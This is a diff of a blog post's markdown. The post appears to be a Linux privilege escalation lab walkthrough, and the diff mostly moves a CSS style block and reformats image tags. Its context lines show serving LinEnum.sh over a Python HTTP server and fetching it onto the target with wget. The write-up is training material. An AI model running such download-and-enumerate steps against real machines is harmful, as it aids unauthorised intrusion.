@@ -9,14 +9,7 @@ Tasks **1**, **2** and **3** don't need explanation.
 To get LinEnum on the target's machine, you need to start a server on your local machine (it has to be in the directory where you store LinEnum.sh or you will have to provide the path to it afterwards) and connect to it from the target :
 
 <img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/python%20listener%20server4.png" class="border" />
-<style>
-  .border {   
-  border-width: 0px;
-  border-color: #7FFF00;
-  border-style: groove;
-  box-shadow: 0px 0px 8px #ADFF2F} 
-</style>
-  
+ 
 ```
 python3 -m http.server 8000
 ```
@@ -26,8 +19,7 @@ python3 -m http.server 8000
 
 Once the server is started, you can request the file you want from the target's console :
 
-
-![](https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/wget%20linenum4.png)
+<img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/wget%20linenum4.png" class="border" />
 
 ```
 wget <YOUR MACHINE'S @IP>:8000/LinEnum.sh
@@ -147,3 +139,10 @@ Long, single-line code blocks should not wrap. They should horizontally scroll i
 ```
 The final element.
 ```
+<style>
+  .border {   
+  border-width: 0px;
+  border-color: #7FFF00;
+  border-style: groove;
+  box-shadow: 0px 0px 8px #ADFF2F} 
+</style>
